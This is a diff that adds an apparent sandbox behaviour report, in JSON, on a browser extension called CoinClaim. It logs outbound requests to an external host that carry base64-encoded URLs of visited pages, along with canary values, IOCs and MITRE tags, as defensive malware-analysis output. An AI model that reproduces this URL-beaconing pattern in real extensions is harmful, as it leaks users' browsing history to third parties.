@@ -1,0 +1,351 @@
+{
+  "schema": "ext-malware-behavior/1.1",
+  "extension_id": "epllefgepapckihklfccpocjbnelpojp__12e5c028",
+  "name": "CoinClaim",
+  "class": "unlabel",
+  "manifest_version": "2",
+  "observed_at": "2026-11-08T22:33:00",
+  "verdict": {
+    "malicious_behavior": true,
+    "exfiltration_confirmed": false,
+    "reason": "contact externe vers hôte(s) non réputé(s) (satorify.io) SANS exfiltration prouvée — à corroborer"
+  },
+  "category": "",
+  "mitre_tags": [
+    "T1071.001 Application Layer Protocol: Web Protocols"
+  ],
+  "mitre": [
+    {
+      "id": "T1071.001",
+      "name": "Application Layer Protocol: Web Protocols",
+      "tactic": "Command and Control",
+      "evidence": "20 outbound request(s) to external host(s), no canary captured"
+    }
+  ],
+  "iocs": {
+    "domains": [
+      "satorify.io"
+    ],
+    "urls": [
+      "https://satorify.io/api/extension/log?b=2fbaYWJvdXQ6Ymxhbms=",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9iYW5rLmh0bWw/dj1DQU5BUlktOUIwNEQ4ODMtSElTVE9SWQ==",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9iYW5rLmh0bWwjeA==",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9sb2dpbg==",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL3NlY3VyZS1wYXlwYWwuY29tL21haWwuaHRtbD92PUNBTkFSWS05QjA0RDg4My1ISVNUT1JZ",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL3NlY3VyZS1wYXlwYWwuY29tL21haWwuaHRtbCN4",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL3NlY3VyZS1wYXlwYWwuY29tL2xvZ2lu",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvZ2luLWNoYXNlLmNvbS9zb2NpYWwuaHRtbD92PUNBTkFSWS05QjA0RDg4My1ISVNUT1JZ",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvZ2luLWNoYXNlLmNvbS9zb2NpYWwuaHRtbCN4",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvZ2luLWNoYXNlLmNvbS9sb2dpbg==",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vc2VhcmNoLmh0bWw/dj1DQU5BUlktOUIwNEQ4ODMtSElTVE9SWQ==",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vc2VhcmNoLmh0bWwjeA==",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vbG9naW4=",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9jaGVja291dC5odG1sP3Y9Q0FOQVJZLTlCMDREODgzLUhJU1RPUlk=",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny93YWxsZXQuaHRtbD92PUNBTkFSWS05QjA0RDg4My1ISVNUT1JZ",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vbG9naW4jeA==",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9jaGVja291dC5odG1sI3g=",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny93YWxsZXQuaHRtbCN4",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9wYXk=",
+      "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9wYXkjeA=="
+    ]
+  },
+  "exfiltration": {
+    "confirmed": false,
+    "canaries_seeded": {
+      "cookie": "CANARY-9B04D883-COOKIE",
+      "creds": "CANARY-9B04D883-CREDS",
+      "history": "CANARY-9B04D883-HISTORY",
+      "storage": "CANARY-9B04D883-LSTORAGE",
+      "dom": "CANARY-9B04D883-DOM",
+      "card": "4111CANARY9B04D8831111",
+      "cvv": "CVV9B04D883",
+      "wallet": "0xCANARY9B04D883DEADBEEF",
+      "seed": "canary 9B04D883 mnemonic seed phrase words"
+    },
+    "hits": [],
+    "stolen_kinds": []
+  },
+  "observed_behavior": {
+    "behaviors": [
+      "external_network_contact"
+    ],
+    "n_external_requests": 20,
+    "outbound_c2": [
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaYWJvdXQ6Ymxhbms=",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9iYW5rLmh0bWw/dj1DQU5BUlktOUIwNEQ4ODMtSElTVE9SWQ==",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9iYW5rLmh0bWwjeA==",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9sb2dpbg==",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL3NlY3VyZS1wYXlwYWwuY29tL21haWwuaHRtbD92PUNBTkFSWS05QjA0RDg4My1ISVNUT1JZ",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL3NlY3VyZS1wYXlwYWwuY29tL21haWwuaHRtbCN4",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL3NlY3VyZS1wYXlwYWwuY29tL2xvZ2lu",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvZ2luLWNoYXNlLmNvbS9zb2NpYWwuaHRtbD92PUNBTkFSWS05QjA0RDg4My1ISVNUT1JZ",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvZ2luLWNoYXNlLmNvbS9zb2NpYWwuaHRtbCN4",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvZ2luLWNoYXNlLmNvbS9sb2dpbg==",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vc2VhcmNoLmh0bWw/dj1DQU5BUlktOUIwNEQ4ODMtSElTVE9SWQ==",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vc2VhcmNoLmh0bWwjeA==",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vbG9naW4=",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9jaGVja291dC5odG1sP3Y9Q0FOQVJZLTlCMDREODgzLUhJU1RPUlk=",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny93YWxsZXQuaHRtbD92PUNBTkFSWS05QjA0RDg4My1ISVNUT1JZ",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vbG9naW4jeA==",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9jaGVja291dC5odG1sI3g=",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny93YWxsZXQuaHRtbCN4",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9wYXk=",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9wYXkjeA==",
+        "method": "GET"
+      }
+    ],
+    "sink_hits": [],
+    "stimulation": [
+      "bank.html",
+      "mail.html",
+      "social.html",
+      "search.html",
+      "checkout.html",
+      "wallet.html"
+    ],
+    "sensitive_permissions": [
+      "tabs"
+    ],
+    "console": [
+      "http://login-chase.com/social.html?v=CANARY-9B04D883-HISTORY",
+      "http://login-chase.com/social.html#x",
+      "http://login-chase.com/login",
+      "http://accounts-google.com/search.html?v=CANARY-9B04D883-HISTORY",
+      "http://accounts-google.com/search.html#x",
+      "http://accounts-google.com/login",
+      "",
+      "http://localhost:59577/checkout.html?v=CANARY-9B04D883-HISTORY",
+      "",
+      "http://localhost:59577/wallet.html?v=CANARY-9B04D883-HISTORY",
+      "http://accounts-google.com/login#x",
+      "http://localhost:59577/checkout.html#x",
+      "http://localhost:59577/wallet.html#x",
+      "http://localhost:59577/pay",
+      "http://localhost:59577/pay#x"
+    ]
+  },
+  "reproducibility": {
+    "n_runs": 1,
+    "rate": 1.0
+  },
+  "evidence": {
+    "chromium": "126.0.6478.182",
+    "all_outbound": [
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaYWJvdXQ6Ymxhbms=",
+        "method": "GET"
+      },
+      {
+        "url": "http://localhost:59577/bank.html?v=CANARY-9B04D883-HISTORY",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9iYW5rLmh0bWw/dj1DQU5BUlktOUIwNEQ4ODMtSElTVE9SWQ==",
+        "method": "GET"
+      },
+      {
+        "url": "http://localhost:59577/favicon.ico",
+        "method": "GET"
+      },
+      {
+        "url": "http://localhost:59577/login",
+        "method": "POST"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9iYW5rLmh0bWwjeA==",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9sb2dpbg==",
+        "method": "GET"
+      },
+      {
+        "url": "http://secure-paypal.com/mail.html?v=CANARY-9B04D883-HISTORY",
+        "method": "GET"
+      },
+      {
+        "url": "https://secure-paypal.com/mail.html?v=CANARY-9B04D883-HISTORY",
+        "method": "GET"
+      },
+      {
+        "url": "http://secure-paypal.com/mail.html?v=CANARY-9B04D883-HISTORY",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL3NlY3VyZS1wYXlwYWwuY29tL21haWwuaHRtbD92PUNBTkFSWS05QjA0RDg4My1ISVNUT1JZ",
+        "method": "GET"
+      },
+      {
+        "url": "http://secure-paypal.com/favicon.ico",
+        "method": "GET"
+      },
+      {
+        "url": "http://secure-paypal.com/login",
+        "method": "POST"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL3NlY3VyZS1wYXlwYWwuY29tL21haWwuaHRtbCN4",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL3NlY3VyZS1wYXlwYWwuY29tL2xvZ2lu",
+        "method": "GET"
+      },
+      {
+        "url": "http://login-chase.com/social.html?v=CANARY-9B04D883-HISTORY",
+        "method": "GET"
+      },
+      {
+        "url": "https://login-chase.com/social.html?v=CANARY-9B04D883-HISTORY",
+        "method": "GET"
+      },
+      {
+        "url": "http://login-chase.com/social.html?v=CANARY-9B04D883-HISTORY",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvZ2luLWNoYXNlLmNvbS9zb2NpYWwuaHRtbD92PUNBTkFSWS05QjA0RDg4My1ISVNUT1JZ",
+        "method": "GET"
+      },
+      {
+        "url": "http://login-chase.com/favicon.ico",
+        "method": "GET"
+      },
+      {
+        "url": "http://login-chase.com/login",
+        "method": "POST"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvZ2luLWNoYXNlLmNvbS9zb2NpYWwuaHRtbCN4",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvZ2luLWNoYXNlLmNvbS9sb2dpbg==",
+        "method": "GET"
+      },
+      {
+        "url": "http://accounts-google.com/search.html?v=CANARY-9B04D883-HISTORY",
+        "method": "GET"
+      },
+      {
+        "url": "https://accounts-google.com/search.html?v=CANARY-9B04D883-HISTORY",
+        "method": "GET"
+      },
+      {
+        "url": "http://accounts-google.com/search.html?v=CANARY-9B04D883-HISTORY",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vc2VhcmNoLmh0bWw/dj1DQU5BUlktOUIwNEQ4ODMtSElTVE9SWQ==",
+        "method": "GET"
+      },
+      {
+        "url": "http://accounts-google.com/favicon.ico",
+        "method": "GET"
+      },
+      {
+        "url": "http://accounts-google.com/login",
+        "method": "POST"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vc2VhcmNoLmh0bWwjeA==",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vbG9naW4=",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9jaGVja291dC5odG1sP3Y9Q0FOQVJZLTlCMDREODgzLUhJU1RPUlk=",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny93YWxsZXQuaHRtbD92PUNBTkFSWS05QjA0RDg4My1ISVNUT1JZ",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2FjY291bnRzLWdvb2dsZS5jb20vbG9naW4jeA==",
+        "method": "GET"
+      },
+      {
+        "url": "http://localhost:59577/pay",
+        "method": "POST"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9jaGVja291dC5odG1sI3g=",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny93YWxsZXQuaHRtbCN4",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9wYXk=",
+        "method": "GET"
+      },
+      {
+        "url": "https://satorify.io/api/extension/log?b=2fbaaHR0cDovL2xvY2FsaG9zdDo1OTU3Ny9wYXkjeA==",
+        "method": "GET"
+      }
+    ]
+  },
+  "provenance": "behavioral-observation (Chrome isolé + sinkhole MAP *, canaries semés)"
+}
